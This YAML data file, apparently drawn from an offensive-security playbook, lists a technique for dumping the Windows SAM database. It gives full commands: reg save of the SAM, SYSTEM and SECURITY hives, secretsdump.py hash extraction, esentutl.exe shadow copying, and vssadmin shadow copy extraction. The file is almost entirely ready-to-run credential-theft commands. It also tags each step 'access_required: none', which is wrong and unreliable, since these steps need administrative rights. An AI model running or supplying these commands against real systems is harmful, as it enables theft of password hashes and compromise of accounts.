- id: sam-database-dumping
  name: SAM Database Dumping
  steps:
  - id: sam-database-dumping.registry-export-method
    title: Registry Export Method
    access_required: none
    mutates: false
    source_line: 83
    commands:
    - lang: cmd
      command: '# Save SAM and SYSTEM hives'
    - lang: cmd
      command: reg save HKLM\SAM sam.save
    - lang: cmd
      command: reg save HKLM\SYSTEM system.save
    - lang: cmd
      command: reg save HKLM\SECURITY security.save
    - lang: cmd
      command: '# Extract hashes with secretsdump'
    - lang: cmd
      command: secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
  - id: sam-database-dumping.esentutl-exe-living-off-the-land
    title: esentutl.exe (Living Off the Land)
    access_required: none
    mutates: false
    source_line: 94
    commands:
    - lang: cmd
      command: '# Copy locked SAM file'
    - lang: cmd
      command: esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\temp\sam
    - lang: cmd
      command: '# Also copy SYSTEM for decryption key'
    - lang: cmd
      command: esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\temp\system
  - id: sam-database-dumping.volume-shadow-copy
    title: Volume Shadow Copy
    access_required: none
    mutates: false
    source_line: 103
    commands:
    - lang: cmd
      command: '# Create shadow copy'
    - lang: cmd
      command: 'vssadmin create shadow /for=C:'
    - lang: cmd
      command: '# Copy SAM from shadow'
    - lang: cmd
      command: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
    - lang: cmd
      command: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
